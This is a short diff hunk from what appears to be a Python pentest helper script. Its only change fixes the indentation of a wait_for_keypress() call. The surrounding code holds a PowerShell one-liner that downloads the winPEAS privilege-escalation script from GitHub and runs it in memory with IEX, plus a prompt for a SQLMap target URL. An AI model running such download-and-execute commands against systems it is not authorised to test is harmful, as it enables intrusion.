@@ -64,7 +64,7 @@ def linpeas():
 def winpeas():
     command = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')\""
     run_command(command)
-     wait_for_keypress()
+    wait_for_keypress()
 
 def SQLMap():
     url = input("Target url: ")
